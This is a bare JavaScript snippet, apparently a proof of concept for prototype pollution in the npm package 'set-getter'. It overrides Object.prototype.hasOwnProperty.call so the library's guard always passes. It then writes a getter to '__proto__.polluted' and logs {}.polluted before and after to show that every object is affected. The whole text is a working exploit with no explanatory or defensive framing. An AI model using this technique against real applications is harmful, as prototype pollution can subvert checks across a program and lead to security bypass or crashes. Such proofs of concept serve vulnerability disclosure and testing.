Object.prototype.hasOwnProperty.call = () => true;
var setGetter = require('set-getter');
var obj = {};
console.log({}.polluted);
setGetter(obj, '__proto__.polluted', function (polluted) {
    return 'yes';
});
console.log({}.polluted);